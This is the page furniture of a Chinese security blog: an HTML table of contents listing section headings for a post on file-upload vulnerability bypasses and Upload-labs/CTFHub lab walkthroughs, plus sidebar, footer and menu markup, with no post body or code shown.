class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%90%8E%E7%BC%80%E5%90%8D%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">一.后缀名检测漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1.黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.3.1.1.1.</span> <span class="toc-text">1.1原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">1.3.1.1.2.</span> <span class="toc-text">1.2 绕过方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-1%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.1.2.1.</span> <span class="toc-text">1.2.1解析漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-2%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.1.1.2.2.</span> <span class="toc-text">1.2.2截断上传</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-3%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.1.2.3.</span> <span class="toc-text">1.2.3大小写绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-4%E9%BB%91%E5%90%8D%E5%8D%95%E6%89%A9%E5%B1%95%E5%90%8D%E7%9A%84%E6%BC%8F%E7%BD%91%E4%B9%8B%E9%B1%BC"><span class="toc-number">1.3.1.1.2.4.</span> <span class="toc-text">1.2.4黑名单扩展名的漏网之鱼</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-5%E5%88%A9%E7%94%A8Windows%E7%9A%84%E5%91%BD%E5%90%8D%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.1.1.2.5.</span> <span class="toc-text">1.2.5利用Windows的命名机制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2-6%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.1.2.6.</span> <span class="toc-text">1.2.6双写绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">2.白名单:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">2.1原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">2.2绕过方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#2-2-1%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.2.2.1.</span> <span class="toc-text">2.2.1解析漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-2-2%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.1.2.2.2.</span> <span class="toc-text">2.2.2截断上传</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-MIME%E6%A3%80%E6%B5%8B%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">二.MIME检测：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFMIME%EF%BC%9A"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1.什么是MIME：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84MIME%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2. 常见的MIME类型:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3. 检测方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-MIME%E7%BB%95%E8%BF%87%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">4. MIME绕过的原理：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-00%E6%88%AA%E6%96%AD%EF%BC%9A"><span class="toc-number">1.3.3.</span> <span class="toc-text">三.00截断：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%EF%BC%9A-1"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1.原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">2.绕过思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.3.4.</span> <span class="toc-text">四.文件头检测漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%EF%BC%9A-2"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">1.原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4%EF%BC%9A"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2.常见的文件头：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">3.操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94-%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">五.内容检测图片马绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.3.4.4.1.</span> <span class="toc-text">1.漏洞原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%EF%BC%9A-%E9%87%8D%E7%82%B9"><span class="toc-number">1.3.4.4.2.</span> <span class="toc-text">2.图片马制作：(重点)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%A7%A3%E6%9E%90%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%9A"><span class="toc-number">1.3.4.4.3.</span> <span class="toc-text">3.解析图片马：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-htaccess%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">一..htaccess文件解析漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-%EF%BC%9A"><span class="toc-number">1.4.1.0.1.</span> <span class="toc-text">1.漏洞利用前提:：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.4.1.0.2.</span> <span class="toc-text">2.原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.1.0.3.</span> <span class="toc-text">3 利用方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-htaccess%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">1.4.1.0.4.</span> <span class="toc-text">4 .htaccess文件内容:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">二.Apache解析漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A-1"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1 漏洞原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2 影响版本：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-IIS6-0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3.IIS6.0&#96;解析漏洞：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-IIS7-0-IIS7-5-Nginx%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.4.3.</span> <span class="toc-text">三.IIS7.0 | IIS7.5 | Nginx的解析漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%EF%BC%9A-3"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">1.原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%BD%A2%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">2.漏洞形式：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-%E5%8F%A6%E5%A4%96%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.4.4.</span> <span class="toc-text">四.另外两种解析漏洞：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">条件竞争漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">二次渲染漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">1.二次渲染原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">2.绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD"><span class="toc-number">1.6.0.3.</span> <span class="toc-text">3.判断</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHub"><span class="toc-number">2.1.</span> <span class="toc-text">CTFHub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.1.</span> <span class="toc-text">无验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">前端验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MINI%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">MINI验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-number">2.1.4.</span> <span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.5.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">2.1.6.</span> <span class="toc-text">*00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5"><span class="toc-number">2.1.7.</span> <span class="toc-text">**文件头检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-labs"><span class="toc-number">2.2.</span> <span class="toc-text">Upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01"><span class="toc-number">2.2.1.</span> <span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02"><span class="toc-number">2.2.2.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03"><span class="toc-number">2.2.3.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-04"><span class="toc-number">2.2.4.</span> <span class="toc-text">Pass-04</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hatccess"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">.hatccess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E9%85%8D%E5%90%88iis%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">分号配合iis解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%92%E5%8F%B7%E9%85%8D%E5%90%88PHP%E5%92%8CWindows%E7%8E%AF%E5%A2%83%E7%9A%84%E5%8F%A0%E5%8A%A0%E7%89%B9%E6%80%A7"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">冒号配合PHP和Windows环境的叠加特性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-05"><span class="toc-number">2.2.5.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-06"><span class="toc-number">2.2.6.</span> <span class="toc-text">Pass-06</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A2%AB%E9%87%8D%E5%91%BD%E5%90%8D%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">文件被重命名的情况下连接蚁剑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-07"><span class="toc-number">2.2.7.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-08"><span class="toc-number">2.2.8.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-09"><span class="toc-number">2.2.9.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-10"><span class="toc-number">2.2.10.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-11"><span class="toc-number">2.2.11.</span> <span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-12"><span class="toc-number">2.2.12.</span> <span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-13"><span class="toc-number">2.2.13.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-14"><span class="toc-number">2.2.14.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-15"><span class="toc-number">2.2.15.</span> <span class="toc-text">Pass-15</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/09/%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%C2%B7%E4%BF%A1%E5%91%BCOA%EF%BC%88CVE-2023-1773%EF%BC%89/" title="第一次代码审计·信呼OA（CVE-2023-1773）">第一次代码审计·信呼OA（CVE-2023-1773）</a><time datetime="2024-08-09T12:23:52.000Z" title="发表于 2024-08-09 20:23:52">2024-08-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell">反弹shell</a><time datetime="2024-08-02T14:29:39.000Z" title="发表于 2024-08-02 22:29:39">2024-08-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/30/CTF-imaginary/" title="CTF-imaginary">CTF-imaginary</a><time datetime="2024-07-30T07:45:04.000Z" title="发表于 2024-07-30 15:45:04">2024-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/29/Summarization/" title="Summarization">Summarization</a><time datetime="2024-07-29T07:15:27.000Z" title="发表于 2024-07-29 15:15:27">2024-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/29/MySQL%E6%8F%90%E6%9D%83/" title="MySQL提权">MySQL提权</a><time datetime="2024-07-29T07:13:51.000Z" title="发表于 2024-07-29 15:13:51">2024-07-29</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="MooSe" target="_blank">MooSe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 留言板</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 随便逛逛</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF-Web/" style="font-size: 0.88rem;">CTF-Web<sup>1</sup></a><a href="/tags/Docker%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">Docker复现<sup>1</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>1</sup></a><a href="/tags/Web-SSRF/" style="font-size: 0.88rem;">Web-SSRF<sup>1</sup></a><a href="/tags/Web-awd/" style="font-size: 0.88rem;">Web-awd<sup>1</sup></a><a href="/tags/Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">Web-文件包含<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 0.88rem;">ctfshow<sup>2</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>2</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">文件包含<sup>1</sup></a><a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 0.88rem;">比赛<sup>1</sup></a></div></div><hr/></div></div><div id="keyboard-tips"><div class="keyboardTitle">博客快捷键</div><div class="keybordList"><div class="keybordItem"><div class="keyGroup"><div class="key">shift K</div></div><div class="keyContent"><div class="content">关闭快捷键功能</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift A</div></div><div class="keyContent"><div class="content">打开/关闭中控台</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift M</div></div><div class="keyContent"><div class="content">播放/暂停音乐</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift D</div></div><div class="keyContent"><div class="content">深色/浅色显示模式</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift S</div></div><div class="keyContent"><div class="content">站内搜索</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift R</div></div><div class="keyContent"><div class="content">随机访问</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift H</div></div><div class="keyContent"><div class="content">返回首页</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift F</div></div><div class="keyContent"><div class="content">友链鱼塘</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift L</div></div><div class="keyContent"><div class="content">友链页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift P</div></div><div class="keyContent"><div class="content">关于本站</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift I</div></div><div class="keyContent"><div class="content">原版/本站右键菜单</div></div></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i 